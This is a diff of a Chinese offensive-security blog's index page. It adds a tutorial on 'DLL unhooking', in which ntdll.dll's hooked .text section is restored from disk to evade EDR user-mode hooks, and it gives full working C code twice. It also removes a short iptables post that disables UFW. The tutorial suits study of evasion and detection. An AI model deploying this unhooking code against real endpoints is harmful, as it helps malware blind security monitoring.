@@ -128,6 +128,76 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2021/12/29/DLL解钩技术/" >DLL解钩技术</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2021-12-29  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>通过从磁盘读取 ntdll.dll 的 .text 部分并将其放在映射到内存中的 ntdll.dll 的 .text 部分的顶部，可以完全解钩（unhook）加载到内存中的任何给定 DLL。这可能有助于bypass一些依赖用户态 API 挂钩的 EDR 解决方案。</p>
+<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>解钩DLL的过程如下面所示。假设ntdll.dll被钩（hook）住了，现在我们来演示如何解钩（unhook）:</p>
+<ol>
+<li>将ntdll.dll的全新副本从磁盘映射到内存。</li>
+<li>找到被钩住的 ntdll.dll 的 .text 部分的虚拟地址（先找到ntdll.dll的基地址，然后用基地址加上.text部分的偏移地址就得到了.text部分的虚拟地址）。</li>
+<li>找到新映射的ntdll.dll的.text部分的虚拟地址。</li>
+<li>获取被挂钩模块的 .text 部分的原始内存保护</li>
+<li>将 .text 部分从新映射的 dll 复制到原始（挂钩）ntdll.dll 的虚拟地址（在第 3 步中找到） - 这是解钩的主要内容，因为所有挂钩字节都被磁盘中的新字节覆盖。</li>
+<li>将原始内存保护应用到原始 ntdll.dll 的解钩的 .text 部分。</li>
+</ol>
+<p>下面是一个简化图，说明了该技术的核心概念，其中 ntdll.dll 的挂钩 .text 部分被替换为磁盘上 ntdll.dll 的 .text 部分的干净副本：</p>
+<p><img src="DLL%E8%A7%A3%E9%92%A9%E6%8A%80%E6%9C%AF.assets/assets/-LFEMnER3fywgFHoroYn/-M9b77N-cstE2jRzZI4M/-M9b7TdH_eS5azVO-Vxe/image.png" alt="img"></p>
+<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>下面的代码是解钩ntdll.dll的示例，你可以将它修改成解钩任何DLL的代码。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winternl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;psapi.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE process = GetCurrentProcess();</span><br><span class="line">	MODULEINFO mi = &#123;&#125;;</span><br><span class="line">	HMODULE ntdllModule = GetModuleHandleA(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	GetModuleInformation(process, ntdllModule, &amp;mi, <span class="keyword">sizeof</span>(mi));</span><br><span class="line">	LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;</span><br><span class="line">	HANDLE ntdllFile = CreateFileA(<span class="string">&quot;c:\\windows\\system32\\ntdll.dll&quot;</span>, GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	HANDLE ntdllMapping = CreateFileMapping(ntdllFile, <span class="literal">NULL</span>, PAGE_READONLY | SEC_IMAGE, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	LPVOID ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;</span><br><span class="line">	PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader-&gt;e_lfanew);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (WORD i = <span class="number">0</span>; i &lt; hookedNtHeader-&gt;FileHeader.NumberOfSections; i++) &#123;</span><br><span class="line">		PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (!<span class="built_in">strcmp</span>((<span class="keyword">char</span>*)hookedSectionHeader-&gt;Name, (<span class="keyword">char</span>*)<span class="string">&quot;.text&quot;</span>)) &#123;</span><br><span class="line">			DWORD oldProtection = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">bool</span> isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader-&gt;VirtualAddress), hookedSectionHeader-&gt;Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &amp;oldProtection);</span><br><span class="line">			<span class="built_in">memcpy</span>((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader-&gt;VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader-&gt;VirtualAddress), hookedSectionHeader-&gt;Misc.VirtualSize);</span><br><span class="line">			isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader-&gt;VirtualAddress), hookedSectionHeader-&gt;Misc.VirtualSize, oldProtection, &amp;oldProtection);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	CloseHandle(process);</span><br><span class="line">	CloseHandle(ntdllFile);</span><br><span class="line">	CloseHandle(ntdllMapping);</span><br><span class="line">	FreeLibrary(ntdllModule);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>请注意，上面的代码没有映像基址重定位。尽管 ntdll.dll 在其 .text 部分中没有任何要重定位的内容，但在处理其他 dll 时可能需要它。</p>
+	
+
+	</div>
+  <a type="button" href="/2021/12/29/DLL解钩技术/#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>通过从磁盘读取 ntdll.dll 的 .text 部分并将其放在映射到内存中的 ntdll.dll 的 .text 部分的顶部，可以完全解钩（unhook）加载到内存中的任何给定 DLL。这可能有助于bypass一些依赖用户态 API 挂钩的 EDR 解决方案。</p>
+<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>解钩DLL的过程如下面所示。假设ntdll.dll被钩（hook）住了，现在我们来演示如何解钩（unhook）:</p>
+<ol>
+<li>将ntdll.dll的全新副本从磁盘映射到内存。</li>
+<li>找到被钩住的 ntdll.dll 的 .text 部分的虚拟地址（先找到ntdll.dll的基地址，然后用基地址加上.text部分的偏移地址就得到了.text部分的虚拟地址）。</li>
+<li>找到新映射的ntdll.dll的.text部分的虚拟地址。</li>
+<li>获取被挂钩模块的 .text 部分的原始内存保护</li>
+<li>将 .text 部分从新映射的 dll 复制到原始（挂钩）ntdll.dll 的虚拟地址（在第 3 步中找到） - 这是解钩的主要内容，因为所有挂钩字节都被磁盘中的新字节覆盖。</li>
+<li>将原始内存保护应用到原始 ntdll.dll 的解钩的 .text 部分。</li>
+</ol>
+<p>下面是一个简化图，说明了该技术的核心概念，其中 ntdll.dll 的挂钩 .text 部分被替换为磁盘上 ntdll.dll 的 .text 部分的干净副本：</p>
+<p><img src="DLL%E8%A7%A3%E9%92%A9%E6%8A%80%E6%9C%AF.assets/assets/-LFEMnER3fywgFHoroYn/-M9b77N-cstE2jRzZI4M/-M9b7TdH_eS5azVO-Vxe/image.png" alt="img"></p>
+<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><p>下面的代码是解钩ntdll.dll的示例，你可以将它修改成解钩任何DLL的代码。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;pch.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winternl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;psapi.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE process = GetCurrentProcess();</span><br><span class="line">	MODULEINFO mi = &#123;&#125;;</span><br><span class="line">	HMODULE ntdllModule = GetModuleHandleA(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	GetModuleInformation(process, ntdllModule, &amp;mi, <span class="keyword">sizeof</span>(mi));</span><br><span class="line">	LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;</span><br><span class="line">	HANDLE ntdllFile = CreateFileA(<span class="string">&quot;c:\\windows\\system32\\ntdll.dll&quot;</span>, GENERIC_READ, FILE_SHARE_READ, <span class="literal">NULL</span>, OPEN_EXISTING, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	HANDLE ntdllMapping = CreateFileMapping(ntdllFile, <span class="literal">NULL</span>, PAGE_READONLY | SEC_IMAGE, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	LPVOID ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;</span><br><span class="line">	PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader-&gt;e_lfanew);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (WORD i = <span class="number">0</span>; i &lt; hookedNtHeader-&gt;FileHeader.NumberOfSections; i++) &#123;</span><br><span class="line">		PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> (!<span class="built_in">strcmp</span>((<span class="keyword">char</span>*)hookedSectionHeader-&gt;Name, (<span class="keyword">char</span>*)<span class="string">&quot;.text&quot;</span>)) &#123;</span><br><span class="line">			DWORD oldProtection = <span class="number">0</span>;</span><br><span class="line">			<span class="keyword">bool</span> isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader-&gt;VirtualAddress), hookedSectionHeader-&gt;Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &amp;oldProtection);</span><br><span class="line">			<span class="built_in">memcpy</span>((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader-&gt;VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader-&gt;VirtualAddress), hookedSectionHeader-&gt;Misc.VirtualSize);</span><br><span class="line">			isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader-&gt;VirtualAddress), hookedSectionHeader-&gt;Misc.VirtualSize, oldProtection, &amp;oldProtection);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	CloseHandle(process);</span><br><span class="line">	CloseHandle(ntdllFile);</span><br><span class="line">	CloseHandle(ntdllMapping);</span><br><span class="line">	FreeLibrary(ntdllModule);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>请注意，上面的代码没有映像基址重定位。尽管 ntdll.dll 在其 .text 部分中没有任何要重定位的内容，但在处理其他 dll 时可能需要它。</p>
+	
+	</div>
+  <a type="button" href="/2021/12/29/DLL解钩技术/#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2021/12/29/SpringBoot信息泄露/" >SpringBoot信息泄露</a>
 		</h3>
 		</div>
@@ -656,68 +726,6 @@
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2021/05/11/Ubuntu执行service-iptables-save报错iptables：unrecognized-service-的解决方法/" >Ubuntu执行service iptables -save报错iptables：unrecognized service 的解决方法</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2021-05-11  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>问题描述：</p>
-<p><img src="Ubuntu%E6%89%A7%E8%A1%8Cservice-iptables-save%E6%8A%A5%E9%94%99iptables%EF%BC%9Aunrecognized-service-%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95.assets/image-20210511171538464-1620724541793.png" alt="image-20210511171538464"></p>
-<p>解决办法：</p>
-<p>因为Ubuntu默认使用的防火墙并不是iptables，所以使用iptables之前需要先禁用UFW。</p>
-<p>命令如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ufw disable</span><br></pre></td></tr></table></figure>
-
-<p>类似地，在CentOS 7服务器的情况下，防火墙也可能是冲突的一个原因。FirewallD默认包含在CentOS 7中。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service iptables save</span><br></pre></td></tr></table></figure>
-
-<p>有时，在Ubuntu服务器中执行以下命令会返回一个无法识别的服务消息。</p>
-<p>该命令基于/etc/init.d文件夹中iptables的启动脚本起作用。 通常，此命令适用于RHEL / Red Hat / CentOS。 在Ubuntu中，要保存防火墙规则的更改，我们使用以下命令</p>
-	
-
-	</div>
-  <a type="button" href="/2021/05/11/Ubuntu执行service-iptables-save报错iptables：unrecognized-service-的解决方法/#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>问题描述：</p>
-<p><img src="Ubuntu%E6%89%A7%E8%A1%8Cservice-iptables-save%E6%8A%A5%E9%94%99iptables%EF%BC%9Aunrecognized-service-%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95.assets/image-20210511171538464-1620724541793.png" alt="image-20210511171538464"></p>
-<p>解决办法：</p>
-<p>因为Ubuntu默认使用的防火墙并不是iptables，所以使用iptables之前需要先禁用UFW。</p>
-<p>命令如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ufw disable</span><br></pre></td></tr></table></figure>
-
-<p>类似地，在CentOS 7服务器的情况下，防火墙也可能是冲突的一个原因。FirewallD默认包含在CentOS 7中。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service iptables save</span><br></pre></td></tr></table></figure>
-
-<p>有时，在Ubuntu服务器中执行以下命令会返回一个无法识别的服务消息。</p>
-<p>该命令基于/etc/init.d文件夹中iptables的启动脚本起作用。 通常，此命令适用于RHEL / Red Hat / CentOS。 在Ubuntu中，要保存防火墙规则的更改，我们使用以下命令</p>
-	
-	</div>
-  <a type="button" href="/2021/05/11/Ubuntu执行service-iptables-save报错iptables：unrecognized-service-的解决方法/#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -788,27 +796,29 @@
 		<h4>Tag Cloud</h4>
 		<ul class="tag_box inline list-unstyled">		
 		
-			<li><a href="/tags/CMD/">CMD<span>1</span></a></li>
+			<li><a href="/tags/Cobalt-Strike插件开发/">Cobalt Strike插件开发<span>2</span></a></li>
+		
+			<li><a href="/tags/提权/">提权<span>1</span></a></li>
+		
+			<li><a href="/tags/JDK/">JDK<span>1</span></a></li>
 		
 			<li><a href="/tags/内网渗透/">内网渗透<span>1</span></a></li>
 		
-			<li><a href="/tags/Cobalt-Strike插件开发/">Cobalt Strike插件开发<span>2</span></a></li>
-		
-			<li><a href="/tags/域/">域<span>1</span></a></li>
-		
-			<li><a href="/tags/SpringBoot/">SpringBoot<span>1</span></a></li>
+			<li><a href="/tags/CMD/">CMD<span>1</span></a></li>
 		
 			<li><a href="/tags/docker/">docker<span>2</span></a></li>
 		
 			<li><a href="/tags/横向移动/">横向移动<span>1</span></a></li>
 		
+			<li><a href="/tags/域/">域<span>1</span></a></li>
+		
 			<li><a href="/tags/iptables/">iptables<span>2</span></a></li>
+		
+			<li><a href="/tags/SpringBoot/">SpringBoot<span>1</span></a></li>
 		
 			<li><a href="/tags/反编译/">反编译<span>1</span></a></li>
 		
-			<li><a href="/tags/JDK/">JDK<span>1</span></a></li>
-		
-			<li><a href="/tags/提权/">提权<span>1</span></a></li>
+			<li><a href="/tags/免杀/">免杀<span>1</span></a></li>
 		
 		 
 		</ul>
@@ -820,6 +830,10 @@
 <div class="widget">
   <h4>Recent Posts</h4>
   <ul class="entry list-unstyled">
+    
+      <li>
+        <a href="/2021/12/29/DLL解钩技术/" ><i class="fa fa-file-o"></i>DLL解钩技术</a>
+      </li>
     
       <li>
         <a href="/2021/12/29/SpringBoot信息泄露/" ><i class="fa fa-file-o"></i>SpringBoot信息泄露</a>
@@ -835,10 +849,6 @@
     
       <li>
         <a href="/2021/07/20/文件隐藏的小技巧/" ><i class="fa fa-file-o"></i>文件隐藏的小技巧</a>
-      </li>
-    
-      <li>
-        <a href="/2021/07/14/脏牛提权/" ><i class="fa fa-file-o"></i>脏牛提权</a>
       </li>
     
   </ul>
